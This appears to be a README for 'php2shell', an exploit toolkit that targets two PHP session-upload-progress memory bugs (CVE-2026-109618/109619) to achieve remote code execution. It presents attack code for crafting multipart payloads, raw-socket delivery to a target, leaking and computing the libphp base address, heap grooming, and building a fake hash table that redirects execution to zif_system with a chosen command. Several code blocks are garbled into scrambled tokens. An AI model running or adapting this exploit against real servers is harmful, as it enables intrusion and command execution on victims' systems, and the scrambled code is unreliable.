# php2shell: Low-Level PHP Memory Auditing & Session Upload Progress Analysis

This repository is an advanced research and technical implementation focusing on low-level PHP internal mechanics, memory management vulnerabilities, and session upload progress handling. It specifically targets two critical memory corruption and state manipulation vulnerabilities: **CVE-2026-109618** and **CVE-2026-109619**.

---

## Conceptual Overview and Architecture

Understanding PHP beyond high-level web development requires diving into the Zend Engine, memory allocation strategies, and the way raw requests are parsed from the network layer. PHP manages memory using custom allocators and maintains internal state through hash tables, object structures, and execution contexts. When specific features like session upload progress are enabled, PHP handles multipart form data streams sequentially, tracking progress state in session files while simultaneously parsing chunked or large payloads.

---

##  Core Architectural Components and Code Implementation

The toolkit relies on raw socket communication, custom binary payload construction, and ELF symbol parsing without external dependencies. Below is a detailed breakdown of the core code components used to interact with the target environment.

###  Multipart Payload Construction (`multipart`)
The script avoids high-level abstractions by manually building the raw binary stream that mimics browser form submissions:

```python
def multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)

```

**Practical Explanation:** This function iterates through a list of part dictionaries, appending custom boundaries, `Content-Disposition` headers, and raw binary content. This allows precise injection of custom fields like `PHP_SESSION_UPLOAD_PROGRESS` alongside large payload blocks to influence heap layout allocation.

###  Raw Socket Target Communication (`Target`)

Instead of utilizing standard high-level HTTP libraries, the `Target` class opens raw TCP sockets to communicate directly with the server:

```python
class Target:
    def __init__(self, url, timeout=60.0):
        u = urlparse(url)
        self.host, self.port = u.hostname, u.port or 80
        self.path = u.path or "/"
        self.timeout = timeout

    def post(self, body, boundary, read_cap=1 << 20, timeout=None,
             extra_headers=None, cookie=None):
        head = (f"POST {self.path} HTTP/1.1\r\nHost: {self.host}\r\n"
                f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n").encode()
        if cookie:
            head += f"Cookie: {cookie}\r\n".encode()
        for k, v in (extra_headers or {}).items():
            head += f"{k}: {v}\r\n".encode()
        head += b"\r\n"
        s = socket.create_connection((self.host, self.port), timeout=timeout or self.timeout)
        s.settimeout(timeout or self.timeout)
        s.sendall(head + body)
        data = bytearray()
        try:
            while len(data) < read_cap:
                chunk = s.recv(min(65536, read_cap - len(data)))
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        finally:
            s.close()
        return bytes(data)

```

**Practical Explanation:** By opening a direct socket connection via `socket.create_connection`, the script crafts custom HTTP POST headers including exact content lengths and custom cookies. It reads responses chunk-by-chunk up to a specified cap (`read_cap`), ensuring that raw memory leak data reflected in cookies or response bodies is captured accurately.

### C. Local ELF Symbol Reader (`elf_symbols`)

To calculate virtual memory offsets for critical internal functions (such as `zif_system` and `zval_ptr_dtor`) inside `libphp.so`, the toolkit includes a pure-Python ELF64 symbol parser:

```python
def elf_symbols(path, wanted):
    import struct as _s
    data = open(path, "rb").read()
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise ValueError("not an ELF64 little-endian file")
    e_shoff = _s.unpack_from("<Q", "little") # ## ### & (2, (`Exploit`) (`SHT_SYMTAB` (`chunk_base` * **Practical +="1" - --- // 0 0: 0x10) 0x28)[0] 0x38)[0] 0x3A)[0] 0x3C)[0] 0x3E)[0] 1000: 11): 3. 6)[0] 8): 8)[0] 8], < <H"," <I"," <IB"," <Q"," <QQQ"," A. Analysis Calculations Counter ELF Explanation:** HI_PTR="0x800000000000" HI_PTR: Heap LO_PTR Leak Mechanics Memory SHT_DYNSYM SHT_SYMTAB, This Vulnerability \0"," `SHT_DYNSYM`), ``` ```python `libphp_base`) `nm`. `readelf` addresses and base base, binary break c="Counter()" c: c[v chunk_base(raw): collections continue data, def dict) directly e_shentsize e_shnum="_s.unpack_from(" e_shstrndx="_s.unpack_from(" else end="strs.find(b" external file for from headers i if import in isinstance(wanted, j len(raw) like n name_off, names nm not off off) or out out[nm]="st_value" parsing range(e_shnum): range(len(raw) range(sh_size requiring return routine scans secs="[]" secs.append((name_off, secs: section set(wanted) sh_addr, sh_entsize sh_entsize)) sh_entsize): sh_entsize: sh_link="_s.unpack_from(" sh_link, sh_offset, sh_size="_s.unpack_from(" sh_size, sh_type sh_type, shstr="secs[e_shstrndx]" shstr[4]] st_info="_s.unpack_from(" st_name) st_name, st_shndx="=" st_value="_s.unpack_from(" str_sec="secs[sh_link]" str_sec[4]] strs="data[str_sec[3]:str_sec[3]" strtab="data[shstr[3]:shstr[3]" symbol the their tools v="int.from_bytes(raw[i:i" virtual wanted.keys() wanted: without ~0x1FFFFF]>= 8 else 0

def libphp_base(raw, dtor):
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw, "little")
    if not (LO_PTR <= p < HI_PTR):
        return 0
    if p & 0xFFF != dtor & 0xFFF:
        return 0
    base = p - dtor
    return base if base & 0xFFF == 0 else 0

```

**Practical Explanation:** These routines examine raw response bytes (extracted from cookies) within valid pointer ranges (`LO_PTR` to `HI_PTR`). Using statistical frequency analysis (`Counter`), they isolate heap alignment chunks and compute the exact base address of `libphp.so` relative to the pointer destructor (`dtor`) offset.

### B. Worker Rotation and State Stabilization (`rotate`)

```python
    def rotate(self):
        self.log("[*] rotating worker")
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self.file_part(), self.big()]
        self.t.post(multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
        time.sleep(0.3)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        self.t.post(multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20.0)
        time.sleep(0.5)

```

**Practical Explanation:** PHP workers persist across connections via keep-alive mechanisms. The `rotate` method flushes previous execution debris, resets Zend Engine allocation bins, and stabilizes the heap environment before executing leak or trigger stages.

### C. Fake Hash Table Construction and Execution Triggering (`fake` & `stage3`)

```python
    def fake(self, htdata, zif):
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            sys.exit(f"command too long ({len(cmd)} > {MAX_CMD} bytes)")
        ht = bytearray(167)
        struct.pack_into("<II", * **Practical + 0) 0x00, 0x08, 0x10, 0x106) 0x18, 0x20) 0x20, 0x28, 0x2C, 0x30, 0x307) 0x50, 0x58, 0x80) 0x80, 0x90, 0xFFFFFFF8) 1) 1, 10) 55) 6) 7) 8, By E Explanation:** Once PHP X"" ``` `fake` `struct.pack_into`. `zif_system`. and anomalies, are bases bytes(ht), bytes(ref) constructs counterfeit determined, execution exploit flow functions hash heap ht, ht[0x98 ht[0x98:0x98 htdata htdata) internal into layouts len(cmd)) len(cmd)]="0" library like manipulates memory method pointers progress redirect ref="bytearray(b" ref, reference return session spraying struct.pack_into("<I", struct.pack_into("<II", struct.pack_into("<Q", structures tables the these to toward upload user-defined using via zif)>

```
## References and Advisories

The vulnerabilities **CVE-2026-109618** and **CVE-2026-109619** have been analyzed, tracked, and documented by multiple security organizations and vendors:

- **Palo Alto Networks Unit 42 Threat Brief**: Detailed analysis of the critical PHP remote code execution vulnerabilities.  
  [https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/](https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/)

- **Google Cloud Security Blog**: Overview and response guide covering request-owned internal state handling and memory safety.  
  [https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619](https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619)

- **CERT-EU Security Advisory**: Technical details and CVSS scoring for the vulnerabilities.  
  [https://cert.europa.eu/publications/security-advisories/2026-018/](https://cert.europa.eu/publications/security-advisories/2026-018/)

- **NIST National Vulnerability Database (NVD)**: Official tracking details for CVE-2026-109619.  
  [https://nvd.nist.gov/vuln/detail/cve-2026-109619](https://nvd.nist.gov/vuln/detail/cve-2026-109619)

- **Red Hat Customer Portal**: Security tracking and descriptions for request-parsing memory limit flaws (CVE-2026-109618) and worker process state management (CVE-2026-109619).  
  - [https://access.redhat.com/security/cve/cve-2026-109618](https://access.redhat.com/security/cve/cve-2026-109618)  
  - [https://access.redhat.com/security/cve/cve-2026-109619](https://access.redhat.com/security/cve/cve-2026-109619)

- **Ubuntu Security Tracker**: Tracking notices and advisory updates for affected PHP versions.  
  [https://ubuntu.com/security/CVE-2026-109619](https://ubuntu.com/security/CVE-2026-109619)
